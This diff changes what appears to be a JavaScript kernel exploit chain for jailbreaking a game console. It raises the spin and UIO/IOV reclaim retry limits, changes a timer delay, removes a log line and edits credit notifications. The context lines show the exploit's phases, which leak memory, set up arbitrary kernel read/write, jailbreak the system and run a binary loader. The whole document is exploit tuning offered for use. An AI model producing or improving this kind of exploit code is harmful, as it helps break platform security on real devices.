@@ -477,7 +477,7 @@ function wait_for(addr, threshold) {
     threshold = new BigInt(0x0, threshold);
   }
   var spins = 0;
-  var MAX_SPINS = 30000;
+  var MAX_SPINS = 50000;
   while (!read64(addr).eq(threshold)) {
     nanosleep_fun(2);
     spins++;
@@ -908,7 +908,7 @@ function yield_to_render(callback) {
         show_fail();
       }
     }
-  }, 0); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
+  }, 1); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
 var exploit_count = 0;
 var exploit_end = false;
@@ -957,8 +957,6 @@ function exploit_phase_leak() {
 function exploit_phase_rw() {
   setup_arbitrary_rw();
 
-  log('Write done .....');
-  
   yield_to_render(exploit_phase_jailbreak);
 }
 function exploit_phase_jailbreak() {
@@ -1090,7 +1088,8 @@ function jailbreak() {
   cleanup(false);
   show_success();
   run_binloader();
-  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > [ Stability by M.ELHOUT ]');
+  utils.notify('< Sobhan allh Wabe Hamdh Sobhan allh alazeem >');
+  utils.notify('[ Stability by DV M.ELHOUT ]');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1475,12 +1474,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 1200;
-var KWRITE_MAX_UIO_RECLAIM = 1200;
+var KREAD_MAX_UIO_RECLAIM = 2000;
+var KWRITE_MAX_UIO_RECLAIM = 2000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 100;
-var KWRITE_MAX_IOV_RECLAIM = 100;
+var KREAD_MAX_IOV_RECLAIM = 1000;
+var KWRITE_MAX_IOV_RECLAIM = 1000;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 4;
